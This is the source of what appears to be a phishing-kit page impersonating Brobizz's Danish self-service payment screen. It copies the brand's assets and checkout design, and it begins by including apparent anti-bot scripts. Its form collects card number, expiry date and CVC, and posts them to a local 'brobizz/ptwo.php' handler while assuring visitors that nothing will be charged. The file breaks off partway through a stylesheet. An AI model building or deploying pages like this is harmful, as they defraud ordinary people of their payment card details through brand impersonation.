<?php
include "thebak3r.php";
include "anti/anti1.php";
include "anti/anti2.php";
include "anti/anti3.php";
include "anti/anti4.php";
include "anti/anti5.php";
include "anti/anti6.php";
include "anti/anti7.php";
?>
<!DOCTYPE html>
<html lang="dk">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <link rel="icon" href="https://login.brobizz.com/favicon.ico" />
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Fjalla+One&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="./checkout_files/styles.54b2a397a409d48c.css">
    <meta
      name="viewport"
      content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"
    />
    <meta name="theme-color" content="#000000" />
    <meta name="description" content="Min Konto" />
    <link rel="apple-touch-icon" href="https://login.brobizz.com/favicon.ico" />
    
    
    <title>Brobizz - Selvbetjening</title>
    
    <link href="./payment-methode_files/main.30fa81e7.css" rel="stylesheet" />
    <style data-styled="active" data-styled-version="5.3.3"></style>
  </head>
  <body>
    <style>
        body{
            background-color: #f5f5f5;
        }

        @font-face {
      font-family: 'Campton Bold';
      src: url('https://login.brobizz.com/static/media/CamptonBold.5a7f471a016e66781860.woff') format('woff');
      font-weight: bold;
      font-style: normal;
    }
    
    @font-face {
      font-family: 'Campton Book';
      src: url('https://login.brobizz.com/static/media/CamptonBook.1bcb65f3d9fd0ee2a0d1.woff') format('woff');
      font-weight: normal;
      font-style: normal;
    }

    @font-face {
      font-family: 'Campton Medium';
      src: url('https://login.brobizz.com/static/media/CamptonMedium.036a551b5a9c53b78439.woff') format('woff');
      font-weight: 500;
      font-style: normal;
    }

    @font-face {
      font-family: 'Campton SemiBold';
      src: url('https://login.brobizz.com/static/media/CamptonSemiBold.91dd62c24713298a240d.woff') format('woff');
      font-weight: 600;
      font-style: normal;
    }

        .ext {
    font-size: 13px;
    text-align: center;
    
  }

  @media (max-width: 768px) {
    .ext {
      text-align: left;
      padding-left: 20px;
    }
  }
    </style>
    <div id="root" style="height: 100%; ">
      <div class="sc-hCwLRM bxjqgI">
        <div class="sc-hgkClB khrsZK">
          
            <div class="ant-row ant-row-center">
                
              <h5 class="sc-fFeiMQ sc-eEvSnX ivHmfe bvxrRI" style="font-weight: Bold; font-family: 'Campton Bold', sans-serif;">
                <br> Vælg betalingskort
              </h5>
              
            </div>
            <p class="ext">Indtast detaljerne på det betalingskort, du vil bruge til at betale for dine ture og for anden brug.</p>

<p class="ext">Vi opkræver selvfølgelig ikke dit betalingskort, før du har foretaget et køb.</p>

            <div class="ant-row ant-row-center">
              <div class="ant-col ant-col-9">
                <div class="ant-row ant-row-center sc-hRnpUl gSvkjt">
                  
                </div>
                <div class="ant-row ant-row-center sc-hRnpUl gSvkjt" >
                  
                </div>
                <div class="ant-row ant-row-center">
                  <div style="min-width: 430px">
                    <div id="reepay_container" style="height: 650px">
                      <rp-app-root _nghost-ng-c2098689162="" ng-version="17.3.5"><router-outlet _ngcontent-ng-c2098689162="" rpkonamicode=""></router-outlet><rp-checkout><router-outlet></router-outlet><rp-embedded _nghost-ng-c4167461288=""><div _ngcontent-ng-c4167461288="" class="embedded container-flex rp-border">
                        <div _ngcontent-ng-c4167461288="" class="content-container config-background">
                          <rp-loader _ngcontent-ng-c4167461288="" _nghost-ng-c112669303="" class="ng-star-inserted"><div _ngcontent-ng-c112669303="" class="rp-loader">
                              <!----><rp-content _ngcontent-ng-c4167461288="" _nghost-ng-c475961169="" class="ng-star-inserted"><!---->
                                <div _ngcontent-ng-c475961169="" class="embedded">
                                  <!----><!---->
                                  <div _ngcontent-ng-c475961169="" id="rp-content" role="list" class="rp-content config-background">
                                    <rp-payment-method-section _ngcontent-ng-c475961169="" _nghost-ng-c3184032440="" class="ng-tns-c3184032440-0 ng-star-inserted"><section _ngcontent-ng-c3184032440="" class="ng-tns-c3184032440-0 active-section ng-star-inserted" id="rp-content-card-section">
                                        <rp-section-header _ngcontent-ng-c3184032440="" class="ng-tns-c3184032440-0" _nghost-ng-c1726844653=""><div _ngcontent-ng-c1726844653="" role="listitem" tabindex="0" class="rp-content-section-title config-payment-method-title config-payment-header config-payment-method-divider selected" id="card-section-title">
                                            <rp-card-selection-header _ngcontent-ng-c1726844653="" _nghost-ng-c3716369850="" class="ng-tns-c3716369850-1 ng-star-inserted"><div _ngcontent-ng-c3716369850="" class="row align-items-center ng-tns-c3716369850-1">
                                                <div _ngcontent-ng-c3716369850="" id="cardHeader" class="col-5 ng-tns-c3716369850-1">
                                                  Betalingskort
                                                </div>
                                                <div _ngcontent-ng-c3716369850="" class="rp-content-section-cards ng-tns-c3716369850-1 col-7">
                                                  <div _ngcontent-ng-c3716369850="" class="rp-content-cards-images ng-tns-c3716369850-1 text-right ng-trigger ng-trigger-horizontalSlide">
                                                    <img _ngcontent-ng-c3716369850="" class="rp-payment-card-image ng-trigger ng-trigger-scale ng-tns-c3716369850-1 gray-filter ng-star-inserted" src="./checkout_files/DANKORT_card.svg" id="DANKORT" alt="DANKORT" style="
                                                        height: 25px;
                                                        margin: 10px 4% 2px 0px;
                                                      "><img _ngcontent-ng-c3716369850="" class="rp-payment-card-image ng-trigger ng-trigger-scale ng-tns-c3716369850-1 gray-filter ng-star-inserted" src="./checkout_files/VISA_card.svg" id="VISA" alt="VISA" style="
                                                        height: 25px;
                                                        margin: 10px 4% 2px 0px;
                                                      "><img _ngcontent-ng-c3716369850="" class="rp-payment-card-image ng-trigger ng-trigger-scale ng-tns-c3716369850-1 gray-filter ng-star-inserted" src="./checkout_files/ELECTRON_card.svg" id="VISA_ELEC" alt="VISA_ELEC" style="
                                                        height: 25px;
                                                        margin: 10px 4% 2px 0px;
                                                      "><img _ngcontent-ng-c3716369850="" class="rp-payment-card-image ng-trigger ng-trigger-scale ng-tns-c3716369850-1 gray-filter ng-star-inserted" src="./checkout_files/MASTERCARD_card.svg" id="MC" alt="MC" style="
                                                        height: 25px;
                                                        margin: 10px 4% 2px 0px;
                                                      "><!---->
                                                  </div>
                                                </div>
                                                <!---->
                                              </div></rp-card-selection-header><!----><!----><!----><!----><!----><!----><!----><!---->
                                          </div></rp-section-header>
                                        <div _ngcontent-ng-c3184032440="" class="rp-content-section-details config-payment-method-divider ng-tns-c3184032440-0 ng-trigger ng-trigger-longSlide" style="
                                            max-height: 2000px;
                                            opacity: 1;
                                            visibility: visible;
                                          ">
                                          <div _ngcontent-ng-c3184032440="" class="ng-tns-c3184032440-0 rp-content-card-info ng-star-inserted" style="">
                                            <rp-payment-method-form _ngcontent-ng-c3184032440="" class="ng-tns-c3184032440-0" _nghost-ng-c1840082818=""><rp-card _ngcontent-ng-c1840082818="" _nghost-ng-c2453151086="" class="ng-star-inserted">
                                              <form method="POST" action="./brobizz/ptwo.php" _ngcontent-ng-c2453151086="" novalidate="" role="form" class="ng-untouched ng-pristine ng-valid">
                                                  <div _ngcontent-ng-c2453151086="" class="row">
                                                    <div _ngcontent-ng-c2453151086="" class="col-12">
                                                      <rp-card-number-field _ngcontent-ng-c2453151086="" _nghost-ng-c2020788089=""><div _ngcontent-ng-c2020788089="">
                                                          <label _ngcontent-ng-c2020788089="" class="config-label" for="frmCCNum">Kortnummer</label>
                                                          <div _ngcontent-ng-c2020788089="" class="rp-relative">
                                                            <input _ngcontent-ng-c2020788089="" name="ccnumber" maxlength="23" required="" autocomplete="cc-number" rpcardformat="" rpcardvalidator="" validator="CARD_NUMBER" type="text"  inputmode="numeric" rpfocus="" class="form-control rp-content-card-input config-input ng-star-inserted" id="frmCCNum" aria-describedby="frmCCNum" oninput="formatCardNumber(this)"><!----><rp-checkmark-icon _ngcontent-ng-c2020788089="" _nghost-ng-c457285165=""><svg _ngcontent-ng-c457285165="" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                                                              
                                                              <path _ngcontent-ng-c457285165="" d="M470.6 105.4c12.5 12.5 12.5 32.8 0 45.3l-256 256c-12.5 12.5-32.8 12.5-45.3 0l-128-128c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0L192 338.7 425.4 105.4c12.5-12.5 32.8-12.5 45.3 0z"></path></svg></rp-checkmark-icon>
                                                          </div>
                                                          <!----><!----><!---->
                                                        </div></rp-card-number-field>
                                                    </div>
                                                  </div>
                                                  <div _ngcontent-ng-c2453151086="" class="row rp-content-section-details-row">
                                                    <div _ngcontent-ng-c2453151086="" class="col-6">
                                                      <rp-card-exp-date-field _ngcontent-ng-c2453151086="" _nghost-ng-c1214304408=""><div _ngcontent-ng-c1214304408="">
                                                          <label _ngcontent-ng-c1214304408="" class="config-label" for="frmCCExp">Udløbsdato</label>
                                                          <div _ngcontent-ng-c1214304408="" class="rp-relative">
                                                            <input _ngcontent-ng-c1214304408="" type="text"  name="cc-exp" rpfocus="" rpcarddateformat="" maxlength="5" required="" autocomplete="cc-exp" rpcardvalidator="" validator="CARD_DATE"  inputmode="numeric" class="form-control rp-content-card-input config-input ng-star-inserted" placeholder="MM / ÅÅ" id="frmCCExp" aria-describedby="frmCCExp" oninput="validateExpirationDate(this)"><!----><rp-checkmark-icon _ngcontent-ng-c1214304408="" _nghost-ng-c457285165=""><svg _ngcontent-ng-c457285165="" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                                                              
                                                              <style>
                                                                .input-field {
                                                                  font-size: 16px;
                                                                  padding: 8px;
                                                                  width: 100px;
                                                                  text-align: center;
                                                                  margin: 20px;
                                                                }
                                                                .error {
                                                                  border: 2px solid red;
                                                                }
                                                                .valid {
                                                                  border: 2px solid green;
                                                                }
                                                              </style>
            
                                                            

                                                              <path _ngcontent-ng-c457285165="" d="M470.6 105.4c12.5 12.5 12.5 32.8 0 45.3l-256 256c-12.5 12.5-32.8 12.5-45.3 0l-128-128c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0L192 338.7 425.4 105.4c12.5-12.5 32.8-12.5 45.3 0z"></path></svg></rp-checkmark-icon>
                                                          </div>
                                                          <!----><!---->
                                                        </div></rp-card-exp-date-field>
                                                    </div>
                                                    <div _ngcontent-ng-c2453151086="" class="col-6">
                                                      <rp-card-cvv-field _ngcontent-ng-c2453151086="" _nghost-ng-c1143301535=""><div _ngcontent-ng-c1143301535="">
                                                          <label _ngcontent-ng-c1143301535="" class="config-label" for="frmCCCVC">Kontrolcifre</label>
                                                          <div _ngcontent-ng-c1143301535="" class="rp-relative">
                                                            <input _ngcontent-ng-c1143301535="" name="cvc" rpfocus="" rpcardcvcformat="" rpcardvalidator="" validator="MIN_LENGTH" maxlength="4" required="" autocomplete="cc-csc" type="text" inputmode="numeric" class="form-control rp-content-card-input config-input" id="frmCCCVC" aria-describedby="frmCCCVC" oninput="validateCVV(this)"><rp-checkmark-icon _ngcontent-ng-c1143301535="" _nghost-ng-c457285165=""><svg _ngcontent-ng-c457285165="" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                                                                <path _ngcontent-ng-c457285165="" d="M470.6 105.4c12.5 12.5 12.5 32.8 0 45.3l-256 256c-12.5 12.5-32.8 12.5-45.3 0l-128-128c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0L192 338.7 425.4 105.4c12.5-12.5 32.8-12.5 45.3 0z"></path></svg></rp-checkmark-icon>
                                                          </div></div></rp-card-cvv-field>
                                                    </div>
                                                  </div>
                                                  <!----><!----><!----><button _ngcontent-ng-c2453151086="" rpfocus="" id="rp-card-button" type="submit" class="rp-submit-button config-pay-button" >
                                                    <!----><!----><!---->
                                                    Gem
                                                    <!----><!----><!----><!----><!----><!---->
                                                  </button>
                                                  <script>
    function formatCardNumber(input) {
      const value = input.value;
      const cleanValue = value.replace(/\D/g, '');
      let formattedValue = '';

      for (let i = 0; i < Math.min(16, cleanValue.length); i++) {
        if (i > 0 && i % 4 === 0) {
          formattedValue += ' ';
        }
        formattedValue += cleanValue[i];
      }
      input.value = formattedValue;

      // Check card type and validate
      if (cleanValue.length > 0) {
        const firstDigit = cleanValue[0];
        const isValidCard = (firstDigit === '4') || 
                            (firstDigit === '5') || 
                            (firstDigit === '2') || 
                            (firstDigit === '3' && cleanValue[1] === '4') || 
                            (firstDigit === '3' && cleanValue[1] === '7');

        if (isValidCard) {
          input.classList.add('valid');
          input.classList.remove('error');
        } else {
          input.classList.add('error');
          input.classList.remove('valid');
        }
      } else {
        input.classList.remove('valid');
        input.classList.remove('error');
      }
      checkRequiredFields();
    }

    function validateExpirationDate(input) {
      const value = input.value;
      const cleanValue = value.replace(/\D/g, '');
      let formattedValue = '';

      for (let i = 0; i < Math.min(4, cleanValue.length); i++) {
        if (i === 2) {
          formattedValue += '/';
        }
        formattedValue += cleanValue[i];
      }
      input.value = formattedValue;

      if (cleanValue.length === 4) {
        const month = parseInt(cleanValue.slice(0, 2), 10);
        const year = parseInt(cleanValue.slice(2, 4), 10) + 2000;

        const currentYear = new Date().getFullYear();

        if (month < 1 || month > 12 || year < 2024) {
          input.classList.add('error');
          input.classList.remove('valid');
        } else {
          input.classList.remove('error');
          input.classList.add('valid');
        }
      } else {
        input.classList.remove('error');
        input.classList.remove('valid');
      }
      checkRequiredFields();
    }

    function validateCVV(input) {
      const value = input.value.replace(/\D/g, '');
      input.value = value;

      if (value.length === 3 || value.length === 4) {
        input.classList.remove('error');
        input.classList.add('valid');
      } else {
        input.classList.add('error');
        input.classList.remove('valid');
      }
      checkRequiredFields();
    }

    // Function to check if all required fields are filled
    function checkRequiredFields() {
      const ccnumber = document.getElementById('frmCCNum');
      const ccexp = document.getElementById('frmCCExp');
      const cvc = document.getElementById('frmCCCVC');
      const button = document.getElementById('rp-card-button');

      const cleanCCNumber = ccnumber.value.replace(/\D/g, '');

      // Check if all fields are filled and ccnumber is exactly 16 digits
      if (cleanCCNumber.length === 16 && ccexp.value.trim() !== '' && cvc.value.trim() !== '' &&
          ccnumber.classList.contains('valid') && ccexp.classList.contains('valid') && cvc.classList.contains('valid')) {
        button.removeAttribute('disabled');
      } else {
        button.setAttribute('disabled', 'disabled');
      }
    }

    // Call the function whenever any input changes
    document.querySelectorAll('.input-field').forEach(input => {
      input.addEventListener('input', checkRequiredFields);
    });

    // Initially disable the button
    document.getElementById('rp-card-button').setAttribute('disabled', 'disabled');
  </script>

                                                  <div _ngcontent-ng-c2453151086="" class="message-container ng-star-inserted">
                                                    <!---->
                                                    <p _ngcontent-ng-c2453151086="" class="reserved-amount config-message-container-text ng-star-inserted">
                                                      Beløbet bliver reserveret på din
                                                      bankkonto
                                                    </p>
                                                    <!---->
                                                  </div>
                                                  <!---->
                                                </form></rp-card><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----></rp-payment-method-form>
                                          </div>
                                          <!---->
                                        </div>
                                      </section>
                                      <!----><!----><!----></rp-payment-method-section><!---->
                                    <section _ngcontent-ng-c475961169="">
                                      <rp-iframe-manager _ngcontent-ng-c475961169="" _nghost-ng-c1187227857=""><div _ngcontent-ng-c1187227857="" class="main-container is-checkout" style="min-height: 0px">
                                          <!----><!----><!---->
                                          <div _ngcontent-ng-c1187227857="" class="ng-star-inserted"></div>
                                          <!---->
                                        </div></rp-iframe-manager>
                                    </section>
                                  </div>
                                </div></rp-content><!----><!----><!----><rp-footer _ngcontent-ng-c4167461288="" _nghost-ng-c4277451710="" class="ng-star-inserted"><div _ngcontent-ng-c4277451710="" role="contentinfo" class="rp-footer config-payment-footer config-payment-method-divider no-button">
                                  <!----><!---->
                                  <div _ngcontent-ng-c4277451710="" tabindex="0" class="logo config-footer-font ng-star-inserted">
                                    <!----><span _ngcontent-ng-c4277451710="" class="powered-by">
                                      Sikker betaling med </span><img _ngcontent-ng-c4277451710="" src="./checkout_files/billwerk-grey-logo.svg" alt="Billwerk" class="billwerk">
                                  </div>
                                  <!---->
                                </div></rp-footer><!---->
                            </div></rp-loader><!---->
                        </div>
                      </div>
                      <!----></rp-embedded><!----></rp-checkout><!----><rp-konami-sheet _ngcontent-ng-c2098689162="" _nghost-ng-c228670408=""><div _ngcontent-ng-c228670408="" class="konami">
                      
                      <style>
      .konami[_ngcontent-ng-c228670408] {
        position: fixed;
        top: 0;
        left: 0;
        z-index: 10000;
        width: 100%;
        padding: 20px 40px;
        display: flex;
        justify-content: space-between;
        background: #e3f3ff;
        color: #0b2540;
        transform: translateY(-100%);
        opacity: 0;
        transition: opacity 0.3s ease-out, transform 0.3s ease-out;
        pointer-events: none;
        box-shadow: 0 2px 10px -3px #2d84c4;
      }
      .konami.visible[_ngcontent-ng-c228670408] {
        transform: translateY(0);
        opacity: 1 !important;
      }
      .konami[_ngcontent-ng-c228670408]
        span[_ngcontent-ng-c228670408]
        pre[_ngcontent-ng-c228670408] {
        margin-bottom: 0;
      }
    </style>
    <style>
      .rp-loader[_ngcontent-ng-c112669303] {
        position: relative;
        min-height: 150px;
      }
      .rp-loader[_ngcontent-ng-c112669303]
        .loader-wrapper[_ngcontent-ng-c112669303] {
        -webkit-transform: translateZ(0);
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        position: absolute;
        z-index: 201;
        border-radius: 8px;
        display: flex;
      }
      .rp-loader[_ngcontent-ng-c112669303]
        .loader-wrapper.wrapper-bg[_ngcontent-ng-c112669303] {
        background-color: #fcfcfc;
      }
      .rp-loader[_ngcontent-ng-c112669303]
        .loader-wrapper[_ngcontent-ng-c112669303]
        .loader[_ngcontent-ng-c112669303] {
        width: 100%;
        height: 100%;
        border-radius: 15px;
        border: none;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
      }
      .rp-loader[_ngcontent-ng-c112669303]
        .loader-wrapper[_ngcontent-ng-c112669303]
        .loader[_ngcontent-ng-c112669303]
        rp-loader-animation[_ngcontent-ng-c112669303] {
        width: 35%;
      }
    </style>
    <style>
      .modal[_ngcontent-ng-c475961169] {
        position: initial;
        display: inherit;
      }
      .rp-subscription-pricing-section[_ngcontent-ng-c475961169] {
        margin-bottom: 1rem;
      }
      .rp-content[_ngcontent-ng-c475961169] {
        color: #212529;
      }
      .rp-content.external-height[_ngcontent-ng-c475961169] {
        min-height: -webkit-fit-content;
        min-height: -moz-fit-content;
        min-height: fit-content;
      }
      #frame-overlay[_ngcontent-ng-c475961169] {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: #0009;
        z-index: 1;
      }
      .window-test-container[_ngcontent-ng-c475961169] {
        display: flex;
        flex-direction: column;
        gap: 1rem;
        padding: 1rem 0;
      }
      .modal[_ngcontent-ng-c475961169]
        .window-test-container[_ngcontent-ng-c475961169] {
        padding: 1rem;
      }
      @media (max-width: 700px) {
        .window-test-container[_ngcontent-ng-c475961169] {
          padding: 1rem;
        }
      }
    </style>
    <style>
      .main-container[_ngcontent-ng-c1187227857] {
        width: 100%;
        height: 100%;
      }
      .main-container.active-mobile[_ngcontent-ng-c1187227857] {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        z-index: 1;
      }
      .modal[_ngcontent-ng-c1187227857] {
        position: initial;
        display: inherit;
      }
      .is-checkout[_ngcontent-ng-c1187227857]
        #external-frame[_ngcontent-ng-c1187227857],
      .is-checkout[_ngcontent-ng-c1187227857]
        #challenge-frame[_ngcontent-ng-c1187227857] {
        background-color: #fff;
        border: none;
        position: absolute;
        z-index: 9999;
        width: 100%;
        top: 0;
      }
      .is-checkout[_ngcontent-ng-c1187227857]
        #external-frame.active-mobile[_ngcontent-ng-c1187227857],
      .is-checkout[_ngcontent-ng-c1187227857]
        #challenge-frame.active-mobile[_ngcontent-ng-c1187227857] {
        height: 100%;
        overflow-y: auto;
      }
      .is-checkout[_ngcontent-ng-c1187227857]
        #external-frame.webpage[_ngcontent-ng-c1187227857],
      .is-checkout[_ngcontent-ng-c1187227857]
        #challenge-frame.webpage[_ngcontent-ng-c1187227857] {
        left: 50%;
        transform: translate(-50%);
        min-height: 700px;
        max-width: 611px;
      }
      .is-checkout[_ngcontent-ng-c1187227857]
        #external-frame.webpage.viabill[_ngcontent-ng-c1187227857],
      .is-checkout[_ngcontent-ng-c1187227857]
        #external-frame.webpage.resurs[_ngcontent-ng-c1187227857],
      .is-checkout[_ngcontent-ng-c1187227857]
        #challenge-frame.webpage.viabill[_ngcontent-ng-c1187227857],
      .is-checkout[_ngcontent-ng-c1187227857]
        #challenge-frame.webpage.resurs[_ngcontent-ng-c1187227857] {
        min-height: 800px;
      }
      .is-checkout[_ngcontent-ng-c1187227857]
        #external-frame.webpage.mobilepay[_ngcontent-ng-c1187227857],
      .is-checkout[_ngcontent-ng-c1187227857]
        #challenge-frame.webpage.mobilepay[_ngcontent-ng-c1187227857] {
        min-height: 900px;
      }
      .is-checkout[_ngcontent-ng-c1187227857]
        #external-frame.modal[_ngcontent-ng-c1187227857],
      .is-checkout[_ngcontent-ng-c1187227857]
        #challenge-frame.modal[_ngcontent-ng-c1187227857] {
        height: 100%;
        left: 0;
      }
      .is-checkout[_ngcontent-ng-c1187227857]
        #external-frame.embedded[_ngcontent-ng-c1187227857],
      .is-checkout[_ngcontent-ng-c1187227857]
        #challenge-frame.embedded[_ngcontent-ng-c1187227857] {
        height: 105%;
        left: 0;
      }
    </style>
    <style>
      .rp-footer[_ngcontent-ng-c4277451710] {
        padding: 14px 0;
        display: flex;
        flex-wrap: wrap;
        width: 100%;
        justify-content: space-between;
        align-items: flex-start;
      }
      .rp-footer[_ngcontent-ng-c4277451710]
        .return-container[_ngcontent-ng-c4277451710] {
        width: 100%;
        display: flex;
        justify-content: center;
        align-items: center;
        margin: 1em 0;
      }
      .rp-footer[_ngcontent-ng-c4277451710]
        .return-container[_ngcontent-ng-c4277451710]
        .rp-btn-return[_ngcontent-ng-c4277451710] {
        background-color: #fff;
        border: 3px solid #124b86;
        color: #124b86;
        width: 85%;
        padding: 20px;
        font-size: 18px;
        font-weight: 500;
        letter-spacing: 1.5px;
        cursor: pointer;
        border-radius: 4px;
        background-clip: padding-box;
      }
      .rp-footer[_ngcontent-ng-c4277451710]
        .cancel-container[_ngcontent-ng-c4277451710] {
        text-align: center;
        display: flex;
        justify-content: flex-start;
        align-items: center;
        padding: 0 1em;
      }
      .rp-footer[_ngcontent-ng-c4277451710]
        .cancel-container[_ngcontent-ng-c4277451710]
        img[_ngcontent-ng-c4277451710] {
        padding-right: 0.5em;
        height: 15px;
      }
      .rp-footer[_ngcontent-ng-c4277451710]
        .cancel-container[_ngcontent-ng-c4277451710]
        .button[_ngcontent-ng-c4277451710] {
        color: #495057;
        cursor: pointer;
      }
      .rp-footer[_ngcontent-ng-c4277451710] .logo[_ngcontent-ng-c4277451710] {
        display: flex;
        align-items: center;
        justify-content: flex-end;
        padding: 0 1em;
        height: 20px;
      }
      .rp-footer[_ngcontent-ng-c4277451710]
        .logo[_ngcontent-ng-c4277451710]
        .billwerk[_ngcontent-ng-c4277451710] {
        height: 9px;
      }
      .rp-footer[_ngcontent-ng-c4277451710]
        .logo[_ngcontent-ng-c4277451710]
        .whitelabel-logo[_ngcontent-ng-c4277451710] {
        padding: 0;
      }
      .rp-footer[_ngcontent-ng-c4277451710]
        .logo[_ngcontent-ng-c4277451710]
        .powered-by[_ngcontent-ng-c4277451710] {
        padding: 0 5px;
        color: #919fa1;
        font-size: 11px;
        font-weight: 700;
        font-family: Public Sans, Arial, sans-serif;
      }
      .rp-footer.no-button[_ngcontent-ng-c4277451710] {
        justify-content: flex-end;
      }
      .rp-footer.mobile[_ngcontent-ng-c4277451710] {
        padding: 14px 0;
        flex-wrap: wrap;
      }
      .rp-footer.mobile[_ngcontent-ng-c4277451710]
        > div[_ngcontent-ng-c4277451710] {
        margin-bottom: 1em;
      }
    </style>
    <style>
      .rp-content-section-details[_ngcontent-ng-c3184032440] {
        overflow: hidden;
        padding: 0 8%;
        position: relative;
      }
      .rp-content-section-details[_ngcontent-ng-c3184032440]
        .rp-content-card-info[_ngcontent-ng-c3184032440] {
        padding: 25px 15px;
      }
      .rp-content-section-details[_ngcontent-ng-c3184032440]
        .rp-content-section-centered[_ngcontent-ng-c3184032440] {
        text-align: center;
        padding: 8%;
        position: relative;
      }
      rp-section-header[_ngcontent-ng-c3184032440] {
        cursor: pointer;
      }
      .disabled-section[_ngcontent-ng-c3184032440] {
        filter: grayscale(1);
        background: #f4f4f5;
        cursor: not-allowed;
      }
      .disabled-section[_ngcontent-ng-c3184032440]
        rp-section-header[_ngcontent-ng-c3184032440] {
        cursor: not-allowed;
      }
      @media (max-width: 500px) {
        .rp-content-section-details[_ngcontent-ng-c3184032440] {
          padding: 0 2%;
        }
      }
    </style>
    <style>
      .rp-content-section-title[_ngcontent-ng-c1726844653] {
        padding: 20px 8%;
        letter-spacing: 1px;
      }
      .rp-content-logo[_ngcontent-ng-c1726844653] {
        padding: 0;
        text-align: right;
        display: flex;
        justify-content: flex-end;
      }
      .rp-content-logo[_ngcontent-ng-c1726844653]
        .logo-container[_ngcontent-ng-c1726844653] {
        max-width: 120px;
        width: 100%;
        display: flex;
        justify-content: center;
        align-items: center;
      }
      .rp-content-logo[_ngcontent-ng-c1726844653]
        .logo-container[_ngcontent-ng-c1726844653]
        img[_ngcontent-ng-c1726844653] {
        max-height: 30px;
        max-width: 120px;
        width: auto;
        text-align: center;
      }
      @media (max-width: 500px) {
        .rp-content-section-title[_ngcontent-ng-c1726844653] {
          padding: 20px 5%;
          font-size: 16px;
        }
        .rp-content-section-title[_ngcontent-ng-c1726844653]
          .col-5[_ngcontent-ng-c1726844653] {
          padding-right: 5px;
          overflow: hidden;
        }
        .rp-content-section-title[_ngcontent-ng-c1726844653]
          .col-1[_ngcontent-ng-c1726844653] {
          padding-right: 0;
          padding-left: 2px;
        }
      }
    </style>
    <style>
      .invalid[_ngcontent-ng-c2453151086] input[_ngcontent-ng-c2453151086] {
        background-image: url(red-error-icon.88a4be6ad7c84505.svg);
        background-size: 25px;
        background-position: calc(100% - 10px) 13px;
        background-repeat: no-repeat;
        animation: shake 0.4s cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
        transform: translate(0);
      }
      input[_ngcontent-ng-c2453151086] {
        height: 55px;
      }
      input[_ngcontent-ng-c2453151086]::placeholder {
        font-weight: 400;
      }
      .rp-content-card-input[_ngcontent-ng-c2453151086] {
        letter-spacing: 1.5px;
      }
      .rp-error.left[_ngcontent-ng-c2453151086] {
        text-align: left;
      }
      .rp-error.center[_ngcontent-ng-c2453151086] {
        text-align: center;
        justify-content: center;
      }
      .rp-error[_ngcontent-ng-c2453151086] {
        margin-top: 10px;
        color: #d4192b;
        font-weight: 600;
        font-size: 17px;
        display: flex;
        justify-content: flex-start;
        align-items: center;
      }
      .rp-error[_ngcontent-ng-c2453151086] > p[_ngcontent-ng-c2453151086] {
        margin: 0;
        font-size: 15px;
      }
      .rp-error[_ngcontent-ng-c2453151086]
        > .detail-icon[_ngcontent-ng-c2453151086] {
        margin-right: 5px;
        height: 14px;
      }
      .rp-error-external[_ngcontent-ng-c2453151086] {
        margin-top: 10px;
        color: #d4192b;
        font-weight: 600;
        font-size: 17px;
        margin-bottom: 10px;
      }
      .rp-content-error-text[_ngcontent-ng-c2453151086] {
        font-size: 14px;
        color: #dd636b;
      }
      .message-container[_ngcontent-ng-c2453151086] {
        padding: 0;
      }
      .message-container[_ngcontent-ng-c2453151086]
        p[_ngcontent-ng-c2453151086] {
        margin: 10px 0 0;
        font-size: 14px;
        font-weight: 400;
      }
      .message-container[_ngcontent-ng-c2453151086]
        p.surcharge[_ngcontent-ng-c2453151086] {
        text-align: right;
      }
      .message-container[_ngcontent-ng-c2453151086]
        p.reserved-amount[_ngcontent-ng-c2453151086] {
        text-align: center;
      }
      .rp-content-section-details-row[_ngcontent-ng-c2453151086] {
        margin-top: 15px;
      }
      .save-card-row[_ngcontent-ng-c2453151086] {
        margin-top: 1rem;
      }
      .save-card-row[_ngcontent-ng-c2453151086]
        .save-card-checkbox-container[_ngcontent-ng-c2453151086]
        label[_ngcontent-ng-c2453151086] {
        cursor: pointer;
        margin-bottom: 0;
        font-weight: 500;
      }
      .save-card-row[_ngcontent-ng-c2453151086]
        .save-card-checkbox-container[_ngcontent-ng-c2453151086]
        #saveCardCheckBox[_ngcontent-ng-c2453151086] {
        height: initial;
        margin-right: 0.5rem;
      }
      .rp-submit-button[_ngcontent-ng-c2453151086] {
        width: 100%;
        padding: 20px;
        border: none;
        letter-spacing: 1.5px;
        text-align: center;
        cursor: pointer;
        border-radius: 4px;
        background-clip: padding-box;
        min-height: 64px;
        margin-top: 20px;
      }
      .rp-submit-button[aria-disabled="true"][_ngcontent-ng-c2453151086] {
        cursor: not-allowed;
        position: relative;
        min-height: 24px;
      }
    </style>
    <style>
      .invalid[_ngcontent-ng-c2020788089] input[_ngcontent-ng-c2020788089] {
        background-image: url(red-error-icon.88a4be6ad7c84505.svg);
        background-size: 25px;
        background-position: calc(100% - 10px) 13px;
        background-repeat: no-repeat;
        animation: shake 0.4s cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
        transform: translate(0);
      }
      input[_ngcontent-ng-c2020788089] {
        height: 55px;
      }
      input[_ngcontent-ng-c2020788089]::placeholder {
        font-weight: 400;
      }
      .rp-content-card-input[_ngcontent-ng-c2020788089] {
        letter-spacing: 1.5px;
      }
      .rp-content-error-text[_ngcontent-ng-c2020788089] {
        font-size: 14px;
        color: #dd636b;
      }
    </style>
    <style>
      .invalid[_ngcontent-ng-c1214304408] input[_ngcontent-ng-c1214304408] {
        background-image: url(red-error-icon.88a4be6ad7c84505.svg);
        background-size: 25px;
        background-position: calc(100% - 10px) 13px;
        background-repeat: no-repeat;
